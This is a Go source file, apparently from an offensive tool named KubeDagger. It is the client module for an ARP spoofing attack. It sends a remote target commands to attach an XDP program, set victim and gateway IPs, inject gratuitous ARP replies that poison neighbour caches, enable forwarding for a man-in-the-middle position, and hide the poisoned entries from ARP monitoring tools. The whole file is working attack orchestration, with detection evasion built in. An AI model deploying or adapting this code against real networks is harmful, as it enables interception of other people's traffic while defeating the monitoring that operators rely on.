package arp_spoof

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type SpoofResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Execute(target, victimIP, gatewayIP, iface, output string) error {
	result := &SpoofResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"attach_xdp_egress",
			"attach XDP program to craft and inject gratuitous ARP replies",
			"arp_spoof_attach_xdp",
		},
		{
			"configure_victim",
			"set victim IP and gateway IP for ARP cache poisoning",
			"arp_spoof_set_targets",
		},
		{
			"start_poisoning",
			"begin periodic gratuitous ARP reply injection to poison neighbor caches",
			"arp_spoof_start",
		},
		{
			"enable_forwarding",
			"enable IP forwarding to maintain connectivity during MITM",
			"arp_spoof_forward",
		},
		{
			"hide_from_arp_watch",
			"filter ARP anomaly detection tools from seeing poisoned entries",
			"arp_spoof_hide",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + victimIP + "#" + gatewayIP + "#" + iface
		status := shared.SendCommand(target, "/arp_spoof", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
